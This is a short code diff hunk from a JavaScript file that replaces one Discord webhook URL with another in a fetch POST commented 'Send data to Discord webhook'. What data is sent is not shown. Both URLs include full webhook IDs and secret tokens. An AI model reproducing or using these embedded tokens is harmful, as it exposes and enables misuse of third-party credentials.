@@ -148,7 +148,7 @@
             
             try {
                 // Send data to Discord webhook
-                const response = await fetch('https://discordapp.com/api/webhooks/1396282658983645334/Nj7TfscxnZXxbScklAQtUGYWmtgmE_qTm9yDVpGkPc1KWUzpuMvJvUx8KNuxBK5epY50', {
+                const response = await fetch('https://discord.com/api/webhooks/1563614031216910507/9T6PGf48fpwibTUfFJbl7wrnxsRfTKPyvpsugcB-P_nFHJk3ENGiorlD9wo3R3w0lKxO', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
